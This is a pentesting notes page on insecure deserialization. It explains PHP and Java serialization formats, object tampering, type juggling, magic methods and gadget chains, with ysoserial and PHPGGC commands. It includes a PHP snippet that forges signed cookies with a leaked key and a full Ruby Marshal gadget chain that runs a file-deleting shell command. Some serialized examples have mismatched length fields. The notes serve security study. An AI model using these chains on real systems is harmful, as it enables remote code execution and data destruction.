------
title: Insecure Deserialization
category: Web
order: 22
---

**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes.
**Deserialization** is the process of resptoring this byte stream to fully functional replica of the original object, in the exact state as when it was serialized.

![](/hackingnotes/images/deserialization-diagram.jpg)

Be aware that when working with different programming languages, serialization may be referred to as *marshalling* (Ruby) or *pickling* (Python). These terms are synonymous with "serialization" in this context. 

**Insecure deserialization** is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code. 

# Identifying serialized objects

Serialized data can be identified relatively easily if you know the format that different languages use.

## PHP serialization format

PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a User object with the attributes: 

```
$user->name = "carlos";
$user->isLoggedIn = true;
```

When serialized, this object may look something like this: 

```
O:4:"User":2:{s:4:"name":s:6:"benjugat"; s:10:"isAdmin":b:0;}
```

This can be interpreted as follows: 

* `O:4:"User"` - An object with the 4-character class name "User"
* `2` - the object has 2 attributes
* `s:4:"name"` - The key of the first attribute is the 4-character string "name"
* `s:6:"benjugat"` - The value of the first attribute is the 6-character string "benjugat"
* `s:10:"isAdmin"` - The key of the second attribute is the 10-character string "isAdmin"
* `b:0` - The value of the second attribute is the boolean value false

The native PHP methods for serialization are `serialize()` and `unserialize()`.

## Java serialization format

Some languages, such as Java, use binary serialization formats. This is more difficult to read, but you can still identify serialized data if you know how to recognize a few tell-tale signs.

Java objects always begin with the same bytes, which are encoded as `ac ed` in hexadecimal or `rO0` in Base64.

Any class that implements the interface `java.io.Serializable` can be serialized and deserialized. If you have source code access, take note of any code that uses the `readObject()` method, which is used to read and deserialize data from an `InputStream`. 


# Manipulating serialized objects

## Modifying object attributes

We can modify the attributes of an object such as the example shown before to obtain privilege rights such as admin.

```
O:4:"User":2:{s:4:"name":s:6:"benjugat"; s:10:"isAdmin":b:0;}
```

So the boolean attribute `isAdmin` can me modified to `true`.

```
O:4:"User":2:{s:4:"name":s:6:"benjugat"; s:10:"isAdmin":b:1;}
```

## Modifying data types

We've seen how you can modify attribute values in serialized objects, but it's also possible to supply unexpected data types.

**PHP-based logic** is particularly vulnerable to this kind of manipulation due to the behavior of its **loose comparison operator (==)** when comparing different data types. It is also known as **PHP type juggling**.

![](/hackingnotes/images/phpstrict.png)

![](/hackingnotes/images/phploose.png)


In PHP 8 and later, the `0 == "Example string"` comparison evaluates to `false` because strings are no longer implicitly converted to `0` during comparisons. As a result, this exploit is not possible on these versions of PHP.

The behavior when comparing an alphanumeric string that starts with a number remains the same in PHP 8. As such, `5 == "5 of something"` is still treated as `5 == 5`.

> **Note**: Remember to update any type labels and lenght indicators in the serialized data.

# Magic methods

Magic methods are a special subset of methods that you do not have to explicitly invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs. Magic methods are a common feature of object-oriented programming in various languages. They are sometimes indicated by prefixing or surrounding the method name with double-underscores. 

One of the most common examples in PHP is `__construct()`, which is invoked whenever an object of the class is instantiated, similar to Python's `__init__`. 

Magic methods are widely used and do not represent a vulnerability on their own. But they can become dangerous when the code that they execute handles attacker-controllable data, for example, from a deserialized object. This can be exploited by an attacker to automatically invoke methods on the deserialized data when the corresponding conditions are met. 

Most importantly in this context, some languages have magic methods that are invoked automatically during the deserialization process. For example, PHP's `unserialize()` method looks for and invokes an object's `__wakeup()` magic method. 

# Injecting arbitrary objects

It is possible to exploit insecure deserialization by simply editing the object supplied by the website. However, injecting arbitrary object types can open up many more possibilities.

Deserialization methods do not typically check what they are deserializing. This means that you can pass in objects of any serializable class that is available to the website, and the object will be deserialized. This effectively allows an attacker to create instances of arbitrary classes. **The fact that this object is not of the expected class does not matter**. The unexpected object type might cause an exception in the application logic, but the malicious object will already be instantiated by then.

* Expected object:

```
O:4:"User":2:{s:4:"name":s:6:"benjugat"; s:10:"isAdmin":b:1;}
```

* Supplied object:

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:10:"morale.txt";}
```

# Gadget Chains

A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. An individual gadget may not directly do anything harmful with user input. However, the attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous "sink gadget", where it can cause maximum damage. 

It is important to understand that, unlike some other types of exploit, a gadget chain is not a payload of chained methods constructed by the attacker. All of the code already exists on the website. The only thing the attacker controls is the data that is passed into the gadget chain. This is typically done using a magic method that is invoked during deserialization, sometimes known as a "kick-off gadget". 

## Working with pre-built gadget chains

Manually identifying gadget chains can be a fairly arduous process, and is almost impossible without source code access. Fortunately, there are a few options for working with pre-built gadget chains that you can try first. 

There are several tools available that provide a range of pre-discovered chains that have been successfully exploited on other websites.

### ysoserial

One such tool for Java deserialization is "ysoserial". This lets you choose one of the provided gadget chains for a library that you think the target application is using, then pass in a command that you want to execute. 

* [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)

```
java -jar ysoserial-all.jar [payload] '[command]'
```

In Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial. For example: 

```
java \
 --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\
 --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\
 --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED\
 --add-opens=java.base/java.net=ALL-UNNAMED \
 --add-opens=java.base/java.util=ALL-UNNAMED \
 -jar ysoserial-all.jar [payload] '[command]'
```

> **Note**: Do obtain in base64 format try to pipe `| base64 -w0`

### PHP Generic Gadget Chains (pphpggc)

Most languages that frequently suffer from insecure deserialization vulnerabilities have equivalent proof-of-concept tools. For example, for PHP-based sites you can use "PHP Generic Gadget Chains" (PHPGGC). 

* [https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)

```
php phpggc -l					#list modules
php phpggc -l LARAVEL			#search modules
php phpggc -i symfony/rce1		#info module
./phpggc Symfony/RCE1 <command>	#create gadget chain
```

If we need to sign a cookie or something like that with a `hmac` key we can try to use the following example code:

```php
<?php      
	$object = "OBJECT-GENERATED-BY-PHPGGC";
	$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
	$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
	echo $cookie
?>
```

## Working with documented gadget chains

There may not always be a dedicated tool available for exploiting known gadget chains in the framework used by the target application. In this case, it's always worth looking online to see if there are any documented exploits that you can adapt manually. Tweaking the code may require some basic understanding of the language and framework, and you might sometimes need to serialize the object yourself, but this approach is still considerably less effort than building an exploit from scratch. 

As an example we can find a gadget chain from `vakzz`

* [https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.encode64(payload)
```